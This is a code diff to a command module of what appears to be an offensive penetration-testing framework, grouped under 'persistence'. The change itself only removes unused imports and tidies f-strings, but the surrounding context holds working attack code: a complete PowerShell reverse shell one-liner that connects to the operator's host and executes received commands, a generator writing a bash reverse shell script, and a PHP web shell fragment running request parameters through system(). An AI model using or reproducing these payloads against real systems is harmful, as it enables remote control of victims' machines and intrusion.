@@ -16,16 +16,9 @@ import cmd2
 from cli.commands._base import LazyOwnCommandSet
 from modules.categories import persistence_category
 from utils import (
-    GREEN,
-    RESET,
-    YELLOW,
     check_lhost,
-    check_rhost,
     copy2clip,
-    print_error,
     print_msg,
-    print_warn,
-    run_command,
 )
 
 
@@ -60,8 +53,8 @@ if(isset($_REQUEST['cmd'])){system($_REQUEST['cmd']);}
         with open("sessions/revshell.sh", "w") as f:
             f.write(script)
         os.chmod("sessions/revshell.sh", 0o755)
-        print_msg(f"[+] Reverse shell created at sessions/revshell.sh")
-        print_msg(f"[+] Run: bash sessions/revshell.sh")
+        print_msg("[+] Reverse shell created at sessions/revshell.sh")
+        print_msg("[+] Run: bash sessions/revshell.sh")
 
     @cmd2.with_category(persistence_category)
     def do_createwinrevshell(self, line):
@@ -73,7 +66,7 @@ if(isset($_REQUEST['cmd'])){system($_REQUEST['cmd']);}
         ps_cmd = f"$client = New-Object System.Net.Sockets.TCPClient('{lhost}',{lport});$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{{0}};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){{;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()}};$client.Close()"
         with open("sessions/revshell.ps1", "w") as f:
             f.write(ps_cmd)
-        print_msg(f"[+] PowerShell reverse shell at sessions/revshell.ps1")
+        print_msg("[+] PowerShell reverse shell at sessions/revshell.ps1")
 
     @cmd2.with_category(persistence_category)
     def do_conptyshell(self, line):
